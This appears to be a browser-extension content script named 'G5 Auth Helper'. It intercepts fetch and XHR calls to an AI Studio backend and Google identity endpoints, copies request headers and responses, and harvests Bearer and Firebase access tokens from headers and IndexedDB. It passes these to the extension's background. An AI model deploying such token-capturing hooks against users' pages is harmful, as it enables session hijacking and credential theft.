(() => {
  function sendMsg(type, data) {
    try { chrome.runtime.sendMessage({ type, ...data }); } catch(e) {}
  }

  // Intercept fetch
  const origFetch = window.fetch;
  window.fetch = async function (...args) {
    const [url, opts] = args;
    const urlStr = typeof url === 'string' ? url : url?.url || '';

    if (urlStr.includes('aistudio-backend') || urlStr.includes('securetoken') || urlStr.includes('identitytoolkit')) {
      const headers = {};
      if (opts?.headers) {
        if (opts.headers instanceof Headers) {
          opts.headers.forEach((v, k) => { headers[k] = v; });
        } else if (typeof opts.headers === 'object') {
          Object.entries(opts.headers).forEach(([k, v]) => { headers[k] = String(v); });
        }
      }

      sendMsg('CAPTURED_REQUEST', { data: { url: urlStr, method: opts?.method || 'GET', headers, timestamp: Date.now() } });

      const auth = headers['Authorization'] || headers['authorization'] || '';
      if (auth.startsWith('Bearer ') && auth.length > 20) {
        sendMsg('FIREBASE_TOKEN', { token: auth.substring(7) });
      }

      if (urlStr.includes('submit-form-stream')) {
        sendMsg('SUBMIT_HEADERS', { headers });
      }
    }

    const resp = await origFetch.apply(this, args);
    if (urlStr.includes('submit-form-stream')) {
      const clone = resp.clone();
      clone.json().then(d => sendMsg('SUBMIT_RESPONSE', { data: d })).catch(() => {});
    }
    return resp;
  };

  // Intercept XHR
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  const origSetReqHeader = XMLHttpRequest.prototype.setRequestHeader;

  XMLHttpRequest.prototype.open = function (m, u) {
    this._url = u; this._method = m; this._hdrs = {};
    return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.setRequestHeader = function (n, v) {
    if (this._hdrs) this._hdrs[n] = String(v);
    return origSetReqHeader.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function (body) {
    if (this._url && this._url.includes('aistudio-backend')) {
      sendMsg('CAPTURED_REQUEST', { data: { url: this._url, method: this._method, headers: this._hdrs, timestamp: Date.now() } });
      const auth = this._hdrs['Authorization'] || this._hdrs['authorization'] || '';
      if (auth.startsWith('Bearer ') && auth.length > 20) {
        sendMsg('FIREBASE_TOKEN', { token: auth.substring(7) });
      }
      if (this._url.includes('submit-form-stream')) {
        sendMsg('SUBMIT_HEADERS', { headers: this._hdrs });
      }
    }
    return origSend.apply(this, arguments);
  };

  // Get Firebase token from IndexedDB
  function getTokenFromIndexedDB() {
    try {
      const req = indexedDB.open('firebaseLocalStorageDb');
      req.onsuccess = function(e) {
        const idb = e.target.result;
        try {
          const tx = idb.transaction('firebaseLocalStorage', 'readonly');
          const store = tx.objectStore('firebaseLocalStorage');
          store.openCursor().onsuccess = function(ev) {
            const cursor = ev.target.result;
            if (cursor) {
              const val = cursor.value;
              if (val && val.value && val.value.stsTokenManager) {
                const token = val.value.stsTokenManager.accessToken;
                if (token && token.length > 20) {
                  sendMsg('FIREBASE_TOKEN', { token });
                }
              }
              cursor.continue();
            }
          };
        } catch(txErr) {}
      };
    } catch(e) {}
  }

  // Run immediately and periodically
  getTokenFromIndexedDB();
  let attempts = 0;
  const interval = setInterval(() => {
    getTokenFromIndexedDB();
    attempts++;
    if (attempts >= 15) clearInterval(interval);
  }, 2000);

  console.log('[G5 Auth Helper] v1.5 installed');
})();
